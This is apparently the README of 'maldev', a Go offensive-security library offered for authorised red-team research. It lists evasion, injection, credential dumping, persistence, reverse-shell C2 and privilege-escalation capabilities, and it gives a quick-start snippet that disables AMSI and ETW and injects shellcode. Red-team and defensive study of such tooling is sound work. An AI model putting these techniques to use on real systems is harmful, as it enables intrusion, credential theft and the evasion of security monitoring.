<p align="center">
  <img src="assets/gopher-pirate.png" alt="maldev pirate gopher mascot" width="128"/>
</p>

# maldev

> A Go library of malware-engineering primitives — injection, evasion,
> credentials, persistence, PE packing, C2 — wired together by one
> `*wsyscall.Caller` so syscall stealth, evasion, and injection compose
> uniformly. Pure Go, no CGO, cross-compilable.

[![Go Reference](https://pkg.go.dev/badge/github.com/oioio-space/maldev.svg)](https://pkg.go.dev/github.com/oioio-space/maldev)
[![Go Report Card](https://goreportcard.com/badge/github.com/oioio-space/maldev)](https://goreportcard.com/report/github.com/oioio-space/maldev)
[![Docs](https://img.shields.io/badge/docs-handbook-blue)](https://oioio-space.github.io/maldev/)
[![License](https://img.shields.io/badge/license-research--only-blue)](LICENSE)

📖 **Full handbook:** <https://oioio-space.github.io/maldev/>

> [!IMPORTANT]
> Authorised security research, red-team operations, and penetration
> testing only. See [LICENSE](LICENSE).

## Scope

A single Go module covering the chain end-to-end:

- **Syscalls** — 4 calling methods (WinAPI / Native / Direct / Indirect)
  × 5 SSN resolvers, all selected via one `*wsyscall.Caller`.
- **Evasion** — AMSI, ETW, ntdll unhooking, sleep mask (XOR / RC4 /
  AES-CTR / Ekko), call-stack spoof, ACG / BlockDLLs, CET, PPID spoof,
  stealth-open, kernel-callback removal, composable presets.
- **Injection** — 15+ methods including CreateRemoteThread, APC family,
  thread hijack, section map, phantom DLL, module stomping, thread pool,
  early-bird, kernel-callback table, EtwpCreateEtwThread.
- **PE ops** — sRDI (Donut), Authenticode cert clone/forge, masquerade
  (13 donor identities × signed blobs), DLL proxy generator, **`pe/packer`**
  (SGN polymorphic stub + LZ4 + AES-CTR, EXE → EXE / EXE → DLL /
  CPU + Win-build dispatched bundles, anti-debug, section randomisation).
- **Credentials** — LSASS dump (pure-Go MSV1_0 parser + PPL bypass),
  SAM offline parse, Golden Ticket forging.
- **Persistence / collection / cleanup** — registry, scheduled tasks,
  service install, LNK, account; keylog / clipboard / screenshot;
  self-delete, multi-pass wipe, timestomp, ADS, BSOD kill switch.
- **C2** — reverse shell + reconnect, TLS / named-pipe / WebSocket
  transports, JA3 fingerprint (uTLS), N-channel fallback Router
  with exponential backoff + operator kill switch, Meterpreter
  staging, multi-session listener, beacon-side SOCKS5 pivot.
- **License framing** — Ed25519-signed authorisation tokens for research
  binaries; multi-binding (machine, password, custom), revocation,
  heartbeat, identity pinning, clock-tamper detection.
- **BYOVD / kernel** — RTCore64 (CVE-2019-16098) R/W primitive.
- **Privesc** — 4 UAC bypasses, CVE-2024-30088 LPE, DLL-hijack helpers.

Full inventory and MITRE/D3FEND mapping: [docs handbook](https://oioio-space.github.io/maldev/).

## Install

```bash
go get github.com/oioio-space/maldev@latest
```

Requires **Go 1.23+**. No CGO.

## Quick start

```go
import (
    "github.com/oioio-space/maldev/evasion"
    "github.com/oioio-space/maldev/evasion/amsi"
    "github.com/oioio-space/maldev/evasion/etw"
    "github.com/oioio-space/maldev/inject"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// 1. Pick a stealthy syscall caller.
caller := wsyscall.New(
    wsyscall.MethodIndirect,
    wsyscall.Chain(wsyscall.NewHashGate(), wsyscall.NewHellsGate()),
)

// 2. Disable in-process defences.
evasion.ApplyAll([]evasion.Technique{
    amsi.ScanBufferPatch(),
    etw.All(),
}, caller)

// 3. Inject shellcode.
injector, _ := inject.NewWindowsInjector(&inject.WindowsConfig{
    Config:        inject.Config{Method: inject.MethodCreateThread},
    SyscallMethod: wsyscall.MethodIndirect,
})
injector.Inject(shellcode)
```

Step-by-step walkthrough → [Get started ▸ Your first packed payload](https://oioio-space.github.io/maldev/get-started/first-payload.html).

## Tooling

Six operator binaries under [`cmd/`](cmd/) — `packer`, `bundle-launcher`,
`bof-runner`, `cert-snapshot`, `rshell`, `sleepmask-demo`. Build them with
`go build ./cmd/<name>`, pass `-h` for flags. See
[Tooling ▸ CLI tools](https://oioio-space.github.io/maldev/tools/index.html).

A seventh tool, [`cmd/license-manager`](cmd/license-manager), manages the full
lifecycle of maldev research licences (issue, revoke, rotate keys, fingerprint
probe, TOTP secrets with QR provisioning, three HTTP servers, runtime theme
switch). See
[docs/license-manager/](docs/license-manager/concepts.md) for the operator
guide.

## Examples

End-to-end chains live under [`examples/`](examples/) — runnable Go programs,
one per scenario (privesc DLL hijack, evasive injection, packer tour, …).
Their narrated counterparts live under
[Cookbook](https://oioio-space.github.io/maldev/examples/) in the handbook.

## Build

```bash
go build ./...
go test ./...
GOOS=linux  go build ./...
GOOS=windows go build ./...
```

Intrusive / VM-only tests are gated behind `MALDEV_INTRUSIVE=1` /
`MALDEV_MANUAL=1` — see the [Testing guide](https://oioio-space.github.io/maldev/testing.html).

## Acknowledgments

- [D3Ext/maldev](https://github.com/D3Ext/maldev) — original inspiration.
- [Binject/go-donut](https://github.com/Binject/go-donut) +
  [TheWover/donut](https://github.com/TheWover/donut) — PE-to-shellcode
  (`pe/srdi`).
- [microsoft/go-winio](https://github.com/microsoft/go-winio) — ADS
  concepts (`cleanup/ads`).

## License

Research-only. See [LICENSE](LICENSE) for the full scope (red-team
operations, technique research, EDR/AV evasion study, defensive RE
training). **Not** for unauthorised production targeting,
mass-distribution, or destructive operations against infrastructure not
under your control.
